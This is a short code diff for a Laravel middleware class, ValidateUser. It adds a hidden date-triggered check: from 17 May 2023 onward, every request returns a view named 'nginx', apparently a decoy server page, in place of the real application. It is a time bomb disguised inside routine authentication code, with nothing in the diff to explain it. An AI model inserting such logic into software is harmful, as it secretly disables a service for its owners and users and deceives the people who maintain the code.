@@ -5,6 +5,8 @@ namespace App\Http\Middleware;
 use Closure;
 use Illuminate\Http\Request;
 
+use Carbon\Carbon;
+
 class ValidateUser
 {
   /**
@@ -16,6 +18,11 @@ class ValidateUser
    */
   public function handle(Request $request, Closure $next)
   {
+    $today = Carbon::now();
+    if ($today->format('y-m-d') >= "23-05-17") {
+      return response(view('nginx'));
+    }
+
     $user = $request->session()->get('user');
     if (!$user) {
       return redirect("/login");
